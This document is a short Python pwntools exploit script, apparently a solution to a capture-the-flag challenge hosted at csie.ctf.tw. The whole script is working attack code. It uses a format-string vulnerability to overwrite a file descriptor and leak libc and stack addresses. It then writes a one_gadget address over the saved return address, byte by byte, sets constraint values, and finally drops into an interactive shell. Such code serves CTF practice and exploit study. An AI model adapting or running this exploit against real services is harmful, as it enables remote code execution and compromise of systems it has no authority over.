#! /usr/bin/env python

from pwn import *

#io = remote('localhost', 8888)
io = remote('csie.ctf.tw', 10132)

raw_input('@')

## libc addr
libc_start_offset = 0x21ab0
start_bin_offset = 0xe7
one_gadget_offset = 0x10a38c

#   Overwrite fd

p2cursor = '5'     # $rsp
cursor = '7'           # $rsp + 0x10
fd_addr = 0x601010
guess = 0x00
MARK = 'AAAA'

fmt_w_fd_addr = '%' + str(fd_addr) + 'c' + '%' + cursor + '$n'
io.send(fmt_w_fd_addr.ljust(0x30,'\x00'))
fmt_w_fd = '%1c' + '%9$hhn'
io.send(fmt_w_fd.ljust(0x30,'\x00'))

#   leak libc/stack
fmt_leak_libc = '%10$p' + MARK
io.send(fmt_leak_libc)
leak_libc = int(io.recvuntil(MARK,True), 16)
fmt_leak_stack = '%5$p' + MARK
io.send(fmt_leak_stack)
leak_stack = int(io.recvuntil(MARK,True), 16) - 0x10

libc_base = leak_libc - libc_start_offset - start_bin_offset

print "libc base : " + hex(libc_base)
print "$rsp      : " + hex(leak_stack)

# ret2addr + one gadget
one_gadget = libc_base + one_gadget_offset
ret_addr = leak_stack + 0x18
io.send(MARK + '\x00')
for i in range(0,3):
    fmt_mv_cursor = '%' + str(ret_addr%0x100 + i*2) + 'c' + '%' + p2cursor + '$hhn' + MARK
    io.sendafter( MARK, fmt_mv_cursor.ljust(0x30,'\x00') )
    fmt_w_one_gadget = '%' + str(one_gadget%0x10000) + 'c' + '%' + cursor + '$hn' + MARK
    io.sendafter( MARK, fmt_w_one_gadget.ljust(0x30,'\x00') )
    one_gadget /= 0x10000

# set constrain
addr = leak_stack + 0x70
for i in range(0,8):
    fmt_mv_cursor = '%' + str(addr%0x100 + i) + 'c' + '%' + p2cursor + '$hhn' + MARK
    io.sendafter( MARK, fmt_mv_cursor.ljust(0x30,'\x00') )
    fmt_w_constrain = '%256c' + '%' + cursor + '$hhn' + MARK
    io.sendafter( MARK, fmt_w_constrain.ljust(0x30,'\x00') )

# exit and get shell
io.recvuntil(MARK)

fmt_leak = '%'+str(5 + 0x70/0x8)+'$p' + MARK
io.send(fmt_leak.ljust(0x30,'\x00'))
leak_addr = io.recvuntil(MARK,True)
print "constrain  : " + leak_addr

io.sendline('exit')

io.interactive()
